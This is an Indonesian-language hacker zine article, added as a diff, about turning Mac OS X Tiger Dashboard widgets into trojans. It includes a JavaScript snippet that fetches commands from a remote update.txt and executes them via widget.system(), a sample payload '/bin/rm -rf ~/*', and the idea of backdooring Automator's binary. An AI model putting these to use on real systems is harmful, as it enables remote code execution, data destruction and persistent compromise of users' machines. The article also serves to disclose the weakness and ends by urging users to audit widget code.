@@ -1,0 +1,137 @@
+
+
+                          ..o:(  echo zine  ):o..                           
+
+                            Volume 03, Issue 12
+
+|--------------------- Mac OS X Dashboard Widget Trojan -------------------|
+|--------------------------------------------------------------------------|
+|-------- digital junkie <digital.junkie@fuckshitpussyfuck.com> -----------|
+
+
+----|  Pendahuluan
+
+Dalam Mac OS X versi 10.4 yang juga dikenal dengan codename "Tiger" memiliki
+fitur yang disebut sebagai Dashboard[1]. Dashboard adalah sebuah aplikasi
+yang memudahkan pengguna mendapatkan informasi dan akses cepat ke
+aplikasi lainnya.
+
+Dashboard didesain dengan sangat minimal sehingga tidak ada penjagaan untuk
+melindungi pengguna dari malicious code seperti trojan. 
+
+
+----|  Analisis Kelemahan
+
+Ada beberapa hal yang menjadi perhatian saya ketika mengamati bagaimana
+Dashboard bekerja:
+
+    --  Dashboard instance berjalan dengan access right user yang sedang
+        login.
+
+    --  Dashboard mengijinkan proses eksekusi program lainnya tanpa
+        melalui proses sanitasi.
+
+    --  Dashboard mengijinkan proses auto-update sebuah Widget oleh
+        Widget itu sendiri kapanpun.
+
+    --  Fitur Access Control List (ACL) pada filesystem tidak diaktifkan
+        secara default. (Googling "OS X fsaclctl" untuk informasi lebih
+        lanjut)
+
+    --  Fasilitas logging pada Dashboard dan Widget sangat buruk.
+
+
+----|  Metode Attack
+
+Karen Widgets pada umumnya menggunakan HTML dan JavaScript code dan memiliki
+akses pada filesystem serta dapat mengakses jaringan, maka terbuka banyak
+kesempatan untuk melakukan attack seperti pada metode Web Hacking (remote
+execution).
+
+Sebagai contoh, berikut ini adalah snippet dari Widget code yang dapat 
+mengeksekusi perintah update:
+
+...
+function updateWidget()
+{
+
+var grabWidget;
+
+    url = "http://www.site.com/update.txt";
+
+    ...
+        grabWidget.send(null);
+        widget.system(grabWidget.responseText,null)
+    }
+}
+...
+
+Dari fungsi updateWidget(), kita dapat mengetahui bahwa widget.system() 
+akan melakukan eksekusi perintah yang diperoleh dari file update.txt. 
+
+Isi file update.txt dapat berupa:
+
+    /bin/rm -rf ~/*
+
+atau perintah-perintah lainnya dengan FULLPATH pada setiap perintah yang 
+diberikan.
+
+Contoh diatas hanyalah salah satu cara bagaimana seseorang dapat membuat
+trojan code menggunakan Dashboard Widget.
+
+Jika user yang sedang login dan menjalankan Dashboard merupakan admin pada
+sistem, maka semakin besar kemungkinan keberhasilan Widget Trojan untuk
+menguasai sistem. Hal ini disebabkan oleh manajemen filesystem Mac OS X yang
+kurang baik. Sebagai contoh, lihat file permission pada aplikasi
+Automator.app
+
+   $ ls -lR /Applications/Automator.app | head -20
+
+   total 0
+   drwxr-xr-x    3 root  admin   102 Jul 13 20:51 .
+   drwxrwxr-x   60 root  admin  2040 Jul 25 22:05 ..
+   drwxrwxr-x    7 root  admin   238 Jul 13 20:47 Contents
+   
+   /Applications/Automator.app/Contents:
+   total 48
+   drwxrwxr-x     7 root  admin    238 Jul 13 20:47 .
+   drwxr-xr-x     3 root  admin    102 Jul 13 20:51 ..
+   -rw-rw-r--     1 root  admin  12738 May 25 06:16 Info.plist
+   drwxrwxr-x     3 root  admin    102 Jul 13 20:47 MacOS
+   -rw-rw-r--     1 root  admin      8 Mar 21 10:59 PkgInfo
+   drwxrwxr-x   138 root  admin   4692 May  9 22:31 Resources
+   -rw-rw-r--     1 root  admin    459 Jul  3 11:24 version.plist
+   
+   /Applications/Automator.app/Contents/MacOS:
+   total 456
+   drwxrwxr-x   3 root  admin     102 Jul 13 20:47 .
+   drwxrwxr-x   7 root  admin     238 Jul 13 20:47 ..
+   -rwxrwxr-x   1 root  admin  231724 May 25 06:17 Automator
+   ...
+
+Widget Trojan yang dijalankan oleh administrator sistem dapat melakukan
+modifikasi file /Applications/Automator.app/Contents/MacOS/Automator untuk
+keperluan backdooring atau menginstal rootkit.
+
+
+----|  Kesimpulan
+
+Pengembangan Dashboard masih terus berlanjut sehingga perlu diamati setiap
+perkembangannya. Sebagai pencegahan, sebelum menginstal sebuah Widget pada 
+sistem Mac OS X sebaiknya melakukan analisis (audit) terlebih dahulu 
+terhadap source codenya.
+
+
+----|  Greetz
+
+    negative, hyponemesis, anonymous/echo (yuck fou, bastard!), 
+    people at naisenodni (hedoplah endonesia raya!!!!1!!1!).
+
+
+----|  Referensi
+
+[1]  Mac OSX Tiger Dashboard v1.0 
+     http://www.apple.com/macosx/features/dashboard/
+
+
+|---- EOF ----------------------------------------------------------------|
